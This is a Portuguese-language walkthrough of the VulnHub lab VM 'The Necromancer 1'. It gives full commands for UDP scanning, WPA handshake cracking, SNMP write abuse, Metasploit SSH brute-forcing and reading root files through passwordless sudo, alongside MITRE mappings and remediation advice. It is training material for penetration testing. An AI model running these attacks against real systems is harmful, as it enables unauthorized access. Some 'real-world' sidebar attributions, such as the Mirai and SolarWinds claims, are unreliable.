# VulnHub: The Necromancer 1 — O Feiticeiro das Redes, Writeup Completo

Bora rapaziada!! Quem diria que um CTF podia parecer uma campanha de RPG dark fantasy completa? The Necromancer 1 é, sem dúvida, um dos desafios mais criativos que já vi no VulnHub. Mano, você vai passar por feitiços UDP, encantamentos em base64, capturas de handshake wireless, rituais SNMP e necromancia binária no GDB antes de finalmente conquistar o root. Caramba, que engenhosidade. ( ͡° ͜ʖ ͡°)

Agradecimento especial ao **xerubus** pela criação desse desafio genialmente encadeado. A mecânica de "cada flag desbloqueia o próximo serviço" é pura arte em CTF, véi.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | The Necromancer: 1 |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/the-necromancer-1,154/ |
| **Técnicas** | UDP scanning, netcat UDP, quebra de MD5, listener TCP, decodificação base64, esteganografia (binwalk), wordlist CeWL, enumeração dirb, exploração binária GDB, aircrack-ng WPA, manipulação SNMP, brute-force SSH, misconfiguraçao sudo |
| **CVEs** | N/A (VM de puzzle intencionalmente vulnerável; técnicas espelham padrões reais) |

> **Dicas do autor:**
> "São 11 flags para coletar e cada flag desbloqueia o próximo passo para o root."

---

## Resumo do Ataque

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[UDP scan: nmap -sU descobre porta 666]
    |
    v
[nc -nvu ALVO 666 -> tcpdump revela callback TCP 4444]
    |
    v
[nc -nvlp 4444 -> recebe payload base64 -> decodifica -> FLAG 1 + MD5]
    |
    v
[quebra MD5 "opensesame" -> envia via UDP 666 -> FLAG 2 -> redireciona HTTP]
    |
    v
[HTTP porta 80: pileoffeathers.jpg -> binwalk -> ZIP oculto -> feathers.txt -> FLAG 3]
    |
    v
[base64 em feathers.txt -> caminho /amagicbridgeappearsatthechasm]
    |
    v
[wordlist de mitologia CeWL -> dirb -> binário /talisman]
    |
    v
[GDB: info functions -> jump chantToBreakSpell -> FLAG 4 -> dica UDP 31337]
    |
    v
[quebra MD5 "blackmagic" -> nc -nvu ALVO 31337 -> FLAG 5 -> download .cap]
    |
    v
[aircrack-ng necromancer.cap + rockyou -> WPA key "death2all"]
    |
    v
[snmpwalk -c death2all ALVO -> snmpset desbloqueia porta -> FLAG 7]
    |
    v
[quebra MD5 FLAG 7 -> username SSH "demonslayer"]
    |
    v
[brute-force ssh_login Metasploit -> senha "12345678"]
    |
    v
[SSH como demonslayer -> FLAGS 8-10 via quiz UDP 777]
    |
    v
[sudo -l -> (ALL) NOPASSWD: /bin/cat -> sudo /bin/cat /root/flag11.txt]
    |
    v
[ROOT + FLAG 11]
```

---

## Metodologia

1. Host discovery no segmento local para identificar o IP do alvo
2. Scan TCP retorna nada; scan UDP revela o ponto de entrada do puzzle na porta 666
3. Interação via netcat + interceptação tcpdump para receber callback TCP e decodificar flags
4. Esteganografia HTTP: ZIP embutido em imagem JPEG, extraído com binwalk
5. Geração de wordlist de mitologia com CeWL; brute-force de diretórios para descobrir binário oculto
6. Análise binária com GDB: pulo direto para função `chantToBreakSpell` não chamada no fluxo normal
7. Quebra de handshake wireless com aircrack-ng (chave WPA2)
8. Abuso de community string SNMP: leitura e write para avançar no puzzle
9. Brute-force SSH com módulo ssh_login do Metasploit
10. Escalação de privilégios via sudo sem senha em `/bin/cat` para ler flag root

---

## Passo 1: Identificando o Alvo

Tá ligado? Todo boot2root começa sabendo onde o alvo está. Em um lab local com VMware ou VirtualBox, o alvo está em algum lugar da sua sub-rede. Usamos arp-scan para encontrá-lo rapidinho, top.

```bash
# Identificar interface e sub-rede primeiro
route -n
# Depois escanear:
arp-scan --localnet --ignoredups
# Alternativa:
nmap -sn 192.168.0.0/24
```

Saída esperada:

```
192.168.0.110   08:00:27:XX:XX:XX   PCS Systemtechnik GmbH (VirtualBox)
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Passo 2: Scan TCP Não Retorna Nada (o Primeiro Truque)

Pô, aqui é onde muita gente desiste achando que a VM está quebrada. Você roda o scan TCP padrão e não recebe absolutamente nada. Ixi. A VM não está com problema; é o puzzle. O desafio inteiro começa em UDP, e se você esquecer o `-sU` você nem começa, mano.

```bash
# Scan TCP completo primeiro (não vai retornar nada)
nmap -A -T4 -p- 192.168.0.110
```

Saída esperada: todas as portas filtradas ou fechadas. ¯\_(ツ)_/¯

Agora o scan UDP:

```bash
# Scan UDP: mais lento mas OBRIGATÓRIO aqui
nmap -sU -T4 --top-ports 1000 192.168.0.110
# Ou todas as portas UDP (lento mas completo):
nmap -sU -T4 -p- 192.168.0.110
```

Saída esperada:

```
PORT    STATE  SERVICE
666/udp open   doom
```

> **Nota real:** Canais C2 baseados em UDP são uma técnica real de evasão de APTs. APT3 e APT28 já usaram beaconing UDP para se misturar ao tráfego DNS e NTP e escapar de monitoramentos focados em TCP. Referência: https://attack.mitre.org/groups/G0022/

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1095 Non-Application Layer Protocol]

---

## Passo 3: UDP 666, Netcat e o Callback TCP

Aqui começa a magia negra de verdade, né. Enviar um pacote netcat para a porta UDP 666 faz a VM se conectar de volta em TCP 4444. Você precisa estar escutando antes de disparar o callback.

```bash
# Configurar o listener PRIMEIRO
nc -nvlp 4444
```

Em um segundo terminal:

```bash
# Cutucando o serviço UDP
nc -nvu 192.168.0.110 666
# Ou enviar uma quebra de linha:
echo "" | nc -nvu 192.168.0.110 666
```

Use tcpdump para confirmar a direção do callback se seu nc estiver lento:

```bash
tcpdump -i eth0 host 192.168.0.110
```

Seu listener na 4444 recebe um blob codificado em base64. Decodifique:

```bash
echo "<BASE64_RECEBIDO>" | base64 -d
```

Resultado esperado: Flag 1 é um hash MD5. Quebre com hashcat ou ferramenta online:

```bash
hashcat -m 0 -a 0 flag1.txt /usr/share/wordlists/rockyou.txt
```

O hash resolve para: `opensesame`

Envie de volta para o serviço UDP:

```bash
echo "opensesame" | nc -nvu 192.168.0.110 666
```

Flag 2 retorna e a dica aponta para HTTP na porta 80. Top demais!! •̀ᴗ•́

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell] [T1040 Network Sniffing]

---

## Passo 4: Esteganografia HTTP, a Imagem que Esconde um ZIP

A porta 80 serve uma página com apenas uma imagem: `pileoffeathers.jpg`. Armadilha clássica de esteganografia em CTF. A imagem não é só uma imagem, véi. Bem, ela é uma imagem, mas também está escondendo um arquivo ZIP dentro dela. Ferramentas como binwalk revelam arquivos embutidos em blobs binários.

> **O que é esteganografia?**
> Esteganografia é a prática de esconder dados dentro de um arquivo transportador aparentemente inocente (imagem, áudio, vídeo). Ao contrário da criptografia, o conteúdo oculto é invisível à inspeção casual. Atacantes a utilizam para exfiltração de dados, canais C2 e entrega de payloads.
> Referência: https://owasp.org/www-community/attacks/Steganography_Attack

```bash
# Baixar a imagem
wget http://192.168.0.110/pileoffeathers.jpg

# Escanear por conteúdo embutido
binwalk pileoffeathers.jpg
```

Saída esperada:

```
DECIMAL   HEXADECIMAL   DESCRIPTION
0         0x0           JPEG image data
xxxxxx    0xxxxxx       Zip archive data, at least v2.0 to extract
```

Extrair:

```bash
binwalk -e pileoffeathers.jpg
# Ou renomear e descompactar manualmente:
cp pileoffeathers.jpg pileoffeathers.zip
unzip pileoffeathers.zip
cat feathers.txt
```

feathers.txt contém uma string codificada em base64. Decodifique:

```bash
cat feathers.txt | base64 -d
```

Você obtém a Flag 3 e um caminho de diretório oculto: `/amagicbridgeappearsatthechasm`. Caramba!! ಠᴗᠠ

> **Nota real:** Exfiltração C2 via esteganografia foi observada em campanhas atribuídas ao APT32 (OceanLotus), que embutia instruções C2 dentro de dados de pixel PNG. Referência: https://www.welivesecurity.com/2019/04/09/oceanlotus-malware-update/

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1005 Data from Local System]

---

## Passo 5: Wordlist CeWL + Brute-Force de Diretórios

O caminho oculto `/amagicbridgeappearsatthechasm` existe, mas seus subdiretórios estão bloqueados atrás de uma wordlist temática. O tema do desafio é mitologia, então uma wordlist genérica não vai resolver aqui. CeWL gera wordlists contextuais fazendo crawling de uma URL, que é exatamente o que precisamos.

```bash
# Construir wordlist temática de mitologia da Wikipedia
cewl https://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 \
  -w /tmp/magicItems.txt -v

# Brute-force no caminho oculto
dirb http://192.168.0.110/amagicbridgeappearsatthechasm \
  /tmp/magicItems.txt
# Alternativa com gobuster (mais rápido):
gobuster dir -u http://192.168.0.110/amagicbridgeappearsatthechasm \
  -w /tmp/magicItems.txt
```

Você encontra o caminho `/talisman`. Baixe o binário:

```bash
wget http://192.168.0.110/amagicbridgeappearsatthechasm/talisman
chmod +x talisman
./talisman
# Saída: apenas um prompt, sem output útil ainda
```

> **MITRE ATT&CK:** [T1083 File and Directory Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Passo 6: Exploração Binária com GDB

Rodar `talisman` não faz nada visível. O truque é que há uma segunda função dentro do binário que nunca é chamada no fluxo normal. O GDB nos permite pular diretamente para ela, ignorando o caminho de execução pretendido. Esse passo é sem dúvida o mais massa do desafio inteiro.

> **O que é essa técnica?**
> Ao definir um breakpoint e usar o comando `jump` do GDB, redirecionamos a execução para um endereço arbitrário dentro do binário. Isso simula uma classe de vulnerabilidades reais, incluindo ROP (Return-Oriented Programming) e sobrescrita de ponteiros de função.
> Referência: https://gcc.gnu.org/onlinedocs/gdb/

```bash
gdb talisman

(gdb) info functions
# Lista todas as funções, incluindo as ocultas
# Você verá: wearTalisman, chantToBreakSpell

(gdb) break main
(gdb) run
(gdb) jump chantToBreakSpell
```

Saída esperada:

```
FLAG 4: [hash MD5]
Vá para UDP porta 31337 com "blackmagic"
```

Quebre o MD5 e envie a palavra mágica:

```bash
echo "blackmagic" | nc -nvu 192.168.0.110 31337
```

Flag 5 retorna junto com uma URL para baixar um arquivo de captura wireless. ԅ(≖‿≖ԅ)

> **Nota real:** Overflows em ponteiros de função e chains ROP são usados em exploits de implants APT reais. Grupos como o Equation Group exploraram técnicas similares a nível binário na entrega do payload ETERNALBLUE. Referência: https://attack.mitre.org/groups/G0020/

> **MITRE ATT&CK:** [T1203 Exploitation for Client Execution] [T1068 Exploitation for Privilege Escalation]

---

## Passo 7: Quebra de Captura Wireless com aircrack-ng

A resposta do UDP 31337 fornece uma URL para um arquivo `.cap`. Baixe-o e quebre o handshake WPA2.

```bash
wget http://192.168.0.110/<caminho>/necromancer.cap

# Quebrar handshake WPA com rockyou
aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
```

Saída esperada:

```
KEY FOUND! [ death2all ]
```

Essa é agora a sua community string SNMP. Top!! ಠᴗᠠ

> **Nota real:** A quebra de handshake WPA2 (ataque de dicionário offline) é idêntica ao que atacantes usaram contra redes wireless corporativas. Requer apenas o handshake capturado, sem precisar estar associado à rede. Referência: https://www.cisa.gov/news-events/alerts/2018/11/30/marriott-data-breach

> **MITRE ATT&CK:** [T1040 Network Sniffing] [T1110.003 Brute Force: Password Spraying]

---

## Passo 8: Enumeração SNMP e Manipulação via Write

SNMP é um daqueles protocolos "legado é um passivo". Se você conhece a community string (basicamente: a senha), pode ler a configuração do dispositivo E escrever nela se o servidor permitir. Aqui o acesso de escrita nos deixa "destrancar uma porta" no encadeamento do puzzle.

> **O que é abuso de community string SNMP?**
> SNMP v1/v2c usa community strings para autenticação. Strings padrão como `public` e `private` são amplamente conhecidas. Acesso de escrita via `private` ou uma string customizada permite que atacantes modifiquem descrições do sistema, configurações de interface ou OIDs customizados.
> Referência: https://cwe.mitre.org/data/definitions/1188.html

```bash
# Enumerar SNMP com a community string quebrada
snmpwalk -c death2all -v 1 192.168.0.110
```

Você verá um OID de "porta bloqueada". Destranque escrevendo um novo valor:

```bash
snmpset -c death2allrw -v 1 192.168.0.110 \
  iso.3.6.1.2.1.1.6.0 s "Unlocked"

# Verificar:
snmpwalk -c death2all -v 1 192.168.0.110
```

Flag 7 é retornada. Seu valor MD5 quebra para: `demonslayer`, que é o username SSH.

> **Nota real:** Acesso de escrita SNMP foi a causa raiz dos incidentes de sequestro BGP em nível de ISP em 2014, onde atacantes usaram strings `private` para redirecionar tráfego. Strings SNMP padrão ainda são encontradas em ambientes de produção em 2025. Referência: https://attack.mitre.org/techniques/T1602/002/

> **MITRE ATT&CK:** [T1602.002 Data from Configuration Repository] [T1078 Valid Accounts]

---

## Passo 9: Brute-Force SSH com Metasploit

Temos o username mas não a senha. Hora do bom e velho brute-force com o módulo ssh_login do Metasploit. O rockyou.txt vai resolver aqui porque a senha é intencionalmente fraca.

```bash
msfconsole -q

use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.0.110
set username demonslayer
set pass_file /usr/share/wordlists/rockyou.txt
set verbose true
run
```

Saída esperada:

```
[+] 192.168.0.110:22 - Success: 'demonslayer:12345678'
```

Fazer login:

```bash
ssh demonslayer@192.168.0.110
# Senha: 12345678
```

> **Nota real:** Brute-force SSH contra a porta 22 exposta é um dos vetores de acesso inicial mais comuns no mundo real. Em 2023, o Shodan indexou mais de 23 milhões de dispositivos com SSH exposto, muitos com credenciais fracas ou padrão. Botnets derivados do Mirai ainda fazem brute-force SSH/Telnet em escala. Referência: https://www.shodan.io/report/ssh

> **MITRE ATT&CK:** [T1110.001 Brute Force: Password Guessing] [T1021.004 Remote Services: SSH]

---

## Passo 10: Quiz UDP 777 e Flags Restantes

Uma vez logado via SSH, há um quiz local em UDP na porta 777. Conecte e responda as perguntas de trivia para desbloquear as flags 8, 9 e 10.

```bash
nc -u localhost 777
# Resposta: Kelewan
# Resposta: Mephistopheles
# Resposta: Hedge
```

Verifique também arquivos ocultos no diretório home:

```bash
ls -la ~
cat .smallvile
```

> **MITRE ATT&CK:** [T1005 Data from Local System] [T1083 File and Directory Discovery]

---

## Passo 11: Escalação de Privilégios via sudo /bin/cat

Configuração errada clássica, mano. O usuário tem sudo sem senha em `/bin/cat`. Mesmo um binário somente de leitura é vetor de escalação quando você pode ler arquivos arbitrários como root. Vacilou na configuração, tomou root na cara dura.

> **O que é misconfiguraçao sudo?**
> Quando `/etc/sudoers` concede acesso `NOPASSWD` a qualquer binário, mesmo os somente de leitura, um atacante pode ler arquivos sensíveis (como `/etc/shadow`, `/root/flag.txt` ou chaves privadas) como root. GTFOBins documenta centenas dessas escapadas.
> Referência: https://gtfobins.github.io/gtfobins/cat/

```bash
sudo -l
# Saída: (ALL) NOPASSWD: /bin/cat

# Ler a flag root:
sudo /bin/cat /root/flag11.txt
```

Saída esperada:

```
You have defeated The Necromancer!
...
Flag 11: [valor da flag final]
```

(☞ﾟヮﾟ)☞ **Root conquistado!! :D**

> **Nota real:** Misconfigurações sudo sem senha são um dos achados mais frequentes em auditorias Linux empresariais. A chain de pós-exploração do SolarWinds em 2020 incluiu abuso de sudo para movimentação lateral em hosts Linux internos. Referência: https://msrc-blog.microsoft.com/2021/06/25/analyzing-solorigate/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo]

> **Referência GTFOBins:** https://gtfobins.github.io/gtfobins/cat/

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Quebrado/Usado |
|------|-------|---------------|----------------|
| Flag 1 | Hash MD5 | Callback TCP 4444 | `opensesame` |
| Flag 2 | Resposta | Resposta UDP 666 | Avanço do puzzle |
| Flag 3 | Base64 | feathers.txt (ZIP em JPEG) | Revelação de caminho |
| Flag 4 | Hash MD5 | GDB jump para chantToBreakSpell | `blackmagic` |
| Flag 5 | Resposta | UDP 31337 | URL do .cap |
| Chave WPA | `death2all` | necromancer.cap quebrado | Community SNMP |
| Flag 7 | Hash MD5 | OID SNMP | `demonslayer` (user SSH) |
| Credencial | `demonslayer:12345678` | Brute-force SSH | Login SSH |
| Flags 8-10 | Respostas trivia | Quiz UDP 777 | Avanço do puzzle |
| Flag 11 | Flag root | `/root/flag11.txt` | via `sudo /bin/cat` |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Scans só TCP perdem serviços UDP | Dispositivos IoT, sistemas legados OT/ICS, DNS, SNMP: todos UDP; ignorar UDP deixa lacunas enormes | Sempre inclua `-sU` no recon, especialmente em avaliações de rede interna |
| 2 | Community strings SNMP padrão com acesso de escrita | SNMP v1/v2c ainda é implantado em milhares de roteadores, switches e impressoras; strings `public`/`private` são quase universais | Desabilite SNMP v1/v2c; adote SNMPv3 com AuthPriv; bloqueie UDP 161/162 no firewall |
| 3 | Frase-senha WPA2 fraca quebrada offline | Wireless corporativo ainda usa WPA2-PSK em muitas PMEs; ataques de dicionário offline requerem apenas o handshake capturado | Adote frases aleatórias de 20+ caracteres; considere WPA3 Enterprise |
| 4 | sudo sem senha em binários utilitários | Mesmo `/bin/cat` vira acesso root de leitura; auditores encontram entradas `NOPASSWD` regularmente em CI e cron de produção | Revise `/etc/sudoers`; exija senha para todos os sudos; aplique menor privilégio |
| 5 | Brute-force SSH bem-sucedido com senha fraca | Porta 22 exposta à internet convida brute-force constante; `12345678` está em todas as wordlists | Implemente autenticação por chave SSH; desative autenticação por senha; use fail2ban |

**Por que isso importa fora do lab?**

The Necromancer simula uma cadeia de ataque real que se mapeia quase perfeitamente para comprometimentos de IoT e redes legadas. Em 2016, a botnet Mirai usou técnicas quase idênticas: enumeração de serviços UDP, credenciais SNMP padrão e brute-force SSH para comprometer centenas de milhares de dispositivos. A combinação de ausência de autenticação, protocolos legados e credenciais fracas ainda é a principal causa raiz em violações de PMEs em 2024.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execução | TA0002 | Exploitation for Client Execution | T1203 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Acesso a Credenciais | TA0006 | Network Sniffing | T1040 |
| Acesso a Credenciais | TA0006 | Data from Configuration Repository | T1602.002 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Descoberta | TA0007 | System Information Discovery | T1082 |
| Movimentação Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Coleta | TA0009 | Data from Local System | T1005 |
| Evasão de Defesa | TA0005 | Obfuscated Files: Steganography | T1027.003 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control: Sudo | T1548.003 |
| Escalação de Privilégios | TA0004 | Exploitation for Privilege Escalation | T1068 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilitar SNMP v1/v2c; migrar para SNMPv3 com modo AuthPriv; restringir SNMP a uma VLAN de gerenciamento dedicada
2. Substituir WPA2-PSK por WPA3-Enterprise ou WPA2-Enterprise com RADIUS; exigir frases de pelo menos 20 caracteres em redes PSK
3. Desabilitar autenticação SSH por senha; exigir autenticação por chave; implementar fail2ban com thresholds agressivos na porta 22
4. Auditar e remover todas as entradas `NOPASSWD` no sudo; exigir senha para toda invocação sudo
5. Bloquear portas UDP não explicitamente necessárias; implementar filtragem ingress/egress para UDP não essencial
6. Remover dados embutidos de todas as imagens acessíveis publicamente; implementar políticas de segurança de conteúdo nos servidores web

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Isolar o segmento afetado do restante da rede (segregação VLAN)
- Rotacionar TODAS as community strings SNMP e credenciais SSH imediatamente
- Bloquear UDP 161/162 no perímetro a menos que explicitamente necessário para monitoramento
- Auditar `/etc/sudoers` e `/etc/sudoers.d/` por entradas `NOPASSWD`
- Revisar logs de autenticação SSH por evidências de brute-force anteriores bem-sucedidos

**Contramedidas MITRE D3FEND:**
- D3-MFA (Multi-Factor Authentication) para contrariar ataques de brute-force T1110
- D3-IVA (Input Validation) para fortalecer endpoints de aplicação web contra T1190
- D3-OPS (OS Process Sandboxing) para limitar abuso SUID/sudo T1548
- D3-CTS (Credential Transmission Scoping) para proteger exposição de credenciais SNMP e SSH

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): Manter inventário completo de ativos incluindo dispositivos apenas UDP (ID.AM-1)
- Proteger (PR): Impor MFA e autenticação por chave (PR.AC-4, PR.AC-7)
- Detectar (DE): Monitorar anomalias UDP e padrões de brute-force SSH (DE.CM-1, DE.CM-7)
- Responder (RS): Isolar segmento e rotacionar credenciais na detecção (RS.MI-1, RS.MI-2)
- Recuperar (RC): Restaurar a partir de baseline limpo; verificar ausência de persistência (RC.RP-1)

**NIST SP 800-53 (Rev. 5):**
- IA-5: Gerenciamento de Autenticadores (complexidade de senha, imposição de chave SSH)
- IA-8: Identificação e Autenticação (usuários não organizacionais)
- AC-6: Menor Privilégio (remoção de sudo NOPASSWD)
- CM-7: Menor Funcionalidade (desabilitar SNMP v1/v2c; desabilitar serviços UDP desnecessários)
- SI-2: Remediação de Falhas (gestão de patches para daemons SNMP e SSH)
- SC-8: Confidencialidade e Integridade de Transmissão (substituir SNMP v1/v2 por v3)

**CISA Known Exploited Vulnerabilities:**
- Abuso de credenciais padrão SNMP é referenciado no Advisory AA22-117A da CISA (2022) cobrindo ataques a infraestrutura crítica
- Brute-force SSH é um dos 5 principais vetores de acesso inicial por relatório de vulnerabilidades mais exploradas da CISA de 2023
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS
- Prática: Identity and Access Management; impor credenciais de menor privilégio para todas as contas de serviço
- MIL Alvo: MIL-2 (práticas definidas, documentadas e gerenciadas)
- Domínio: SITUATIONAL AWARENESS
- Prática: Logging and Monitoring; detectar anomalias UDP, operações SNMP write e brute-force SSH
- MIL Alvo: MIL-2

---

## Considerações Finais

Valeu demais ao **xerubus** por criar um CTF que genuinamente parece uma aventura dark fantasy. A mecânica de encadeamento de flags, onde cada flag desbloqueia o próximo serviço, é uma aula de design de puzzle. Se você quase desistiu porque o TCP não retornou nada, acabou de aprender uma das lições mais valiosas em segurança de redes do mundo real: sempre faça scan UDP.

The Necromancer mapeia quase perfeitamente como comprometimentos de IoT e redes legadas acontecem no mundo real: recon UDP, abuso SNMP, credenciais wireless fracas, brute-force SSH e sudo misconfiguraçao. Cada passo deste desafio aparece em relatórios reais de pentest. Isso o torna um campo de treinamento genuinamente valioso além dos pontos de CTF.

Se esse writeup te ajudou, compartilha com a galera e continua hackeando. A próxima VM está esperando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
